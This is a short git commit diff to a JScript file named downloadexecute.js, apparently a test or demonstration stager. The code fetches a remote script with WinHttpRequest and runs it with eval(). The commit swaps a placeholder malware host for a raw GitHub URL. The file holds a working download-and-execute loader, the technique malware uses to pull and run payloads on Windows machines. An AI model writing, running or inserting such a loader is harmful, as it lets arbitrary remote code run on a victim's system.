e5a1d72e63f3bef2bb550dbd7bf0313d995b41be
Yorkvik <31284407+yorkvik@users.noreply.github.com>
2023-04-28 10:55:43 +0200

    Update downloadexecute.js

--- downloadexecute.js
+++ downloadexecute.js
@@ -1,5 +1,5 @@
 net = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-net.Open("GET","http://malware[.]com/malware.js",false);
+net.Open("GET","https://raw.githubusercontent.com/yorkvik/files/master/testjs.js",false);
 net.Send();
 js = net.ResponseText;
 eval(js);
